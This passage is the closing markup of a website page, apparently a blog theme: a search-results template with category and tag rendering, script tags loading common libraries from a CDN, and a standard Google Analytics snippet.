text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-KK5XXRT4LD"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-KK5XXRT4LD'); }); </script>
